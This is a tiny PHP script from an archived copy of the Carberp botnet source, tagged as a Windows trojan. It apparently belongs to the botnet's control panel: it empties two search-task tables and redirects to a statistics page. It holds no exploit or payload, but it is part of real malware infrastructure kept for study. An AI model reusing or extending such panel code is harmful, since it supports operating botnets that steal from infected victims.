/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

$mysqli->query('TRUNCATE TABLE bf_search_task');
$mysqli->query('TRUNCATE TABLE bf_search_result');

header('Location: /main/stat.html');
exit;

?>